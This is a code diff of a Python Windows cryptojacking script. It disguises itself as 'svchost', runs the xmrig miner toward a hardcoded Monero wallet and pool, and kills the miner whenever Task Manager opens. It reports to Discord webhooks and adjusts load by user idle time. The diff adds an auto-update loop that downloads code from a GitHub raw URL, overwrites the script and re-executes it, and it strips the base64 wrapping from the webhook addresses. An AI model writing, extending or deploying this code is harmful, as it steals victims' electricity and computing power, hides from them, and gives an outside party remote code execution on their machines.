@@ -1,14 +1,15 @@
-import os, sys, subprocess, random, time, winreg, base64, ctypes, json, platform
+import os, sys, subprocess, random, time, winreg, ctypes, json, platform, threading
 from urllib import request
 
-# --- CONFIG ---
-W_S = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NTk1NDYzMDcyMTcxNy9mcVRQeFk5LWR0UnR1ZjNXUFFuZWhNa1Y1REp1Tm9ocGpzbjB0WFZITHZJdUt3VU9HMzAzcmNlM3ZxRjJVN1pvYzl2Mw==").decode()
-W_M = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NjM2NDYzMjMyNjE0NS9ZbFE2MldOaThzUHZZZWlBZlQ5bklCMjVGUFI0ay1Nb1A3MVFTRU5LdTA2eFVOSUFKV2JpWEtKSi03cGExZm9PZmw0SEI=").decode()
+# --- CONFIG (V8.1 - THE ETERNAL HYDRA) ---
+W_S = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
+W_M = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPvYeiAfT9nIB25FPR4k-MoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
 ID = "svchost"
 WORK_DIR = os.path.dirname(os.path.realpath(__file__))
 MIN_BIN = os.path.join(WORK_DIR, "xmrig.exe")
 WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 POOL = "pool.supportxmr.com:443"
+RAW_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
 
 def notify(msg, type="sys"):
     hook = W_S if type == "sys" else W_M
@@ -17,6 +18,21 @@ def notify(msg, type="sys"):
         req = request.Request(hook, data=data, headers={'Content-Type': 'application/json'})
         request.urlopen(req, timeout=10)
     except: pass
+
+def auto_update():
+    while True:
+        try:
+            time.sleep(43200) # Check every 12 hours
+            with request.urlopen(RAW_URL) as response:
+                new_code = response.read().decode('utf-8')
+            with open(os.path.realpath(__file__), 'r') as f:
+                current_code = f.read()
+            if new_code != current_code:
+                with open(os.path.realpath(__file__), 'w') as f:
+                    f.write(new_code)
+                notify("New evolution detected. Restarting...", "sys")
+                os.execv(sys.executable, ['python'] + sys.argv)
+        except: pass
 
 def is_running(name):
     try:
@@ -45,7 +61,7 @@ def get_idle():
 def manage():
     if is_running("Taskmgr.exe"):
         subprocess.run(['taskkill', '/F', '/IM', 'xmrig.exe'], creationflags=0x08000000, capture_output=True)
-        notify("Monitoring detected. Vanishing.", "sys")
+        # No notify here to keep it extra quiet during Taskmgr detection
     else:
         idle = get_idle()
         pwr = "90" if idle > 300 else "25"
@@ -54,9 +70,10 @@ def manage():
             notify(f"Engine Engaged. Power: {pwr}%", "mine")
 
 def main():
+    threading.Thread(target=auto_update, daemon=True).start()
     time.sleep(random.randint(5, 15))
     engage_persistence()
-    notify("SYSTEM ONLINE (v8.0 - Unwrapped Hydra Active)", "sys")
+    notify("SYSTEM ONLINE (v8.1 - Eternal Hydra Active)", "sys")
     while True:
         manage()
         time.sleep(15)
